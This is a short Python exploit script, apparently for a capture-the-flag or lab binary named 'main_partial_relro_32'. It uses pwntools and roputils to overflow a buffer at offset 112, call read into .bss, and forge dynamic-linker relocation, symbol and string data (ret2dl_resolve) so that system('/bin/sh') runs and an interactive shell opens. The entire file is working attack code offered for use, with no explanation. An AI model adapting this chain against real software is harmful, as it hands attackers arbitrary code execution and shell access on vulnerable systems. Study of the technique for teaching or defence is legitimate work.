from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main_partial_relro_32')
context.log_level = 'debug'
r.recv()

rop = ROP('./main_partial_relro_32')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
# call _dl_runtime_resolve
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
# forge fake data, including relocation, symbol, str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
